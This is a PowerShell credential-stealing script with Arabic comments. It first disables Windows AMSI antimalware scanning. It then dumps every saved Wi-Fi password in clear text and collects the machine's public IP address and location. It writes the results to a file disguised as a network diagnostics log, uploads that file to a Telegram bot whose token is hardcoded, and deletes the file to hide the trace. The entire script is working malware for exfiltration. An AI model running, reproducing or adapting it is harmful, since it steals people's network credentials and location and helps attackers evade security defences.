# --- [1] كسر الحماية (Shadow Bypass V3) ---
$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$s.GetField('amsiContext','NonPublic,Static').SetValue($null,(New-Object IntPtr(0)));

# --- [2] إعدادات العميل صفر ---
$t = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
$c = "7393359923"

# --- [3] قنص تقرير الشبكة ---
$reportPath = "$env:TEMP\Net_Diagnostics_Log.txt"
"--- NETWORK SNIPER REPORT ---`n" | Out-File $reportPath

# سحب باسورادت الواي فاي
"--- [ STORED WIFI PASSWORDS ] ---" | Out-File $reportPath -Append
$profiles = netsh wlan show profiles | Select-String "\:(.*)$" | ForEach-Object { $_.Matches.Value.Trim(": ").Trim() }
foreach($profile in $profiles){
    $pass = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content\W+\:(.*)$" | ForEach-Object { $_.Matches.Value.Split(":")[1].Trim() }
    "SSID: $profile | PASS: $pass" | Out-File $reportPath -Append
}

# سحب معلومات الـ IP والموقع
"`n--- [ INTERNET & IP INFO ] ---" | Out-File $reportPath -Append
$ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json" | ConvertTo-Json
$ipInfo | Out-File $reportPath -Append

# إرسال التقرير النهائي للبوت
curl.exe -F "chat_id=$c" -F "document=@$reportPath" "https://api.telegram.org/bot$t/sendDocument"

# تنظيف الأثر
Remove-Item $reportPath -Force
